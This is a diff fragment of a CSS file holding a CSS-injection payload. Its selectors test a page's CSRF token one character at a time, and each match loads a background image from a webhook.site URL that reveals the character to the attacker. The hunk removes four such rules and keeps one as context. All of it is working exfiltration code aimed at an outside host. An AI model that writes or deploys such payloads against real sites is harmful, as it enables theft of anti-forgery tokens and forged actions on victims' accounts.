@@ -473,23 +473,3 @@ input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA7~"] {
   background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?~);
 }
 
-input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA7£"] {
-  visibility: visible;
-  background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?£);
-}
-
-input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA7¤"] {
-  visibility: visible;
-  background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?¤);
-}
-
-input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA7ù"] {
-  visibility: visible;
-  background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?ù);
-}
-
-input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA7Ä"] {
-  visibility: visible;
-  background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?Ä);
-}
-
